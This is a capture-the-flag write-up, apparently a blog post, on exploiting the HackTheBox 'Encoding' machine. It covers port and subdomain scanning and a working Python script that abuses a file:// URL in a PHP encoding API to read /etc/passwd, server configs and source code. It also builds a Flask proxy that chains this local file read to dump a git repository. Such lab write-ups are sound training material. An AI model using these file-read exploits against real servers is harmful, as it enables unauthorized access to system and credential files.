---
layout: post
title: HTB Encoding
cover-img: /assets/covers/Encoding.png
excerpt_separator: <!--more-->
tags: [HTB, HackTheBox]
comments: true
---
Encoding is an medium difficulty machine realeased on HackTheBox.
<!--more-->

## Recon

Nmap scan shows only HTTP and SSH ports open:

```
❯ nmap -p- -sC -oN encoding.nmap 10.10.11.198
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 17:34 CEST
Nmap scan report for 10.10.11.198
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http
|_http-title: HaxTables

Nmap done: 1 IP address (1 host up) scanned in 20.78 seconds
```

## Website

Looking at the website, it claims that is is a string and number encoding tool:
![Website](/assets/screenshots/htb-encoding/website.png)

The `API` page is interesting, First the URL looks like it could allow LFI:
```
http://10.10.11.198/index.php?page=api
```

I tried `php://filter/convert.base64-encode/resource=index.php` and `../../../../../../etc/passwd` payloads but both failed, so i will move on for now.
The `API` page contains documenattion about API to this website. It mentions `api.haxtables.htb` subdomain, so i will add this to my */etc/hosts/* file and start a subdomain fuzzing. And it reveals additional subdomain, `image`:
```
❯ ffuf -H "Host: FUZZ.haxtables.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://haxtables.htb -fs 1999                                                      19:10:30

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://haxtables.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.haxtables.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 1999
________________________________________________

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
    * FUZZ: api

[Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 37ms]
    * FUZZ: image
```

However vising the url http://image.haxtables.htb/ returns 403 Forbidden error, as indicated by ffuf, so i will move on for now.

The website shows some examples how to use the API. Among other things, i can use it to encode and read a file by specifying an URL:

![API](/assets/screenshots/htb-encoding/api.png)

First thing i thought when seeing this: "What happens if i change the protocol to file://?" I will slightly modify the request from the example, changing the protocol and decoding the file, and it works, i have an LFI!
```python
import requests
from base64 import b64decode
import json

json_data = {
    'action': 'b64encode',
    'file_url' : 'file:///etc/passwd'

}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)

resp_json = json.loads(response.text)

text =  b64decode(resp_json["data"]).decode()
print(text)
```

```
❯ python3 api.py
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
svc:x:1000:1000:svc:/home/svc:/bin/bash
...
```
I will that there is  `www-data` user, who is probably running the webapp and `svc` user. I tried reading the ssh key of `svc` user, but as expected it didn't work. I made a guess that the index of the main webpage is going to be located at `/var/www/html/index.php`, and it is, but it is mostly pure HTML so it doesn't reveal much.

It would be much more interesting to look at the source code of the two subdomain that i discovered earlier. This web serer is run using Apache, and the configuration for virtual hosts is usually located at `/etc/apache2/sites-enabled/000-default.conf`. It works and i can read this configuration:
```
<VirtualHost *:80>
        ServerName haxtables.htb
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html


        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>


<VirtualHost *:80>
        ServerName api.haxtables.htb
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/api
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost
        
        DocumentRoot /var/www/image

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        #SecRuleEngine On

        <LocationMatch />
                SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
                SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
                SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
                SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
                Header always set Retry-After "10" env=RATELIMITED
        </LocationMatch>

        ErrorDocument 429 "Rate Limit Exceeded"

        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Now i see why i couldn't access the `image` subdomain, it only allows visits from localhost. Now that i know the directiories of `api` and `image` subdomains, i can the file vulnerable to the LFI, located at `/var/www/api/v3/tools/string/index.php`:
```php
<?php
include_once '../../../utils.php';
include_once 'utils.php';

if (isset($_FILES['data_file'])) {
    $action = $_POST['action'];
    $data = file_get_contents($_FILES['data_file']['tmp_name']);
} else {
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];

    if ( empty($jsondata) || !array_key_exists('action', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);

    }

    if (array_key_exists('file_url', $jsondata)) {
        $data = get_url_content($jsondata['file_url']);
    } else {
        $data = $jsondata['data'];
    }

}

if ($action  === 'str2hex') {
    echo jsonify(['data'=> str2hex($data)]);

} else if  ($action === 'hex2str') {
    echo jsonify(['data' => hex2str($data) ]);

} else if ($action === 'md5') {
    echo jsonify(['data'=> md5($data)]);

} else if ($action === 'sha1') {
    echo jsonify(['data'=> sha1($data)]);

} else if ($action === 'urlencode') {
    echo jsonify(['data'=> urlencode($data)]);

} else if ($action === 'urldecode') {
    echo jsonify(['data'=> urldecode($data)]);

} else if ($action === 'b64encode') {
    echo jsonify(['data'=> base64_encode($data)]);

} else if ($action === 'b64decode') {
    echo jsonify(['data'=> base64_decode($data)]);

} else {
    echo jsonify(['message'=> 'Invalid action'], 404);
}

?>
```
Not much interesting here. I can also look at both the `utils.php` file it includes, and change the version from `v3` to `v1` and `v2`, but none of theese files seem to offer anything to progress.

I will turn my attention to `image` subdomain for now. Looking at the file `/var/www/image/index.php` i see that it includes `utils.php`:
```php
<?php 

include_once 'utils.php';

include 'includes/coming_soon.html';

?>
```
The `utils.php` file is even more interesting:
```php
<?php

// Global functions

function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);

    exit;
}

function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;

}

function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
?>
```
So, judging by the git* functions, `/var/www/image` is a git repository. Now, i would like to use a tool like [gitdumper](https://github.com/arthaud/git-dumper) to dump the contents of this repository. I can only access using the LFI, and not directly. To get around this, i will start a webserver on my localhost, where any request to $path will perform the LFI at `/var/www/image/$path`. This should allow gitdumper to dumo the repo. The webserver code in python:
```python
from flask import Flask
import json
import requests
from base64 import b64decode
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def redirect(path):
    json_data = {
        'action': 'b64encode',
        'file_url' : f'file:///var/www/image/{path}'

    }

    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)

    resp_json = json.loads(response.text)

    text =  b64decode(resp_json["data"]).decode()

    return text

if __name__ == "__main__":
    app.run("0.0.0.0")
```
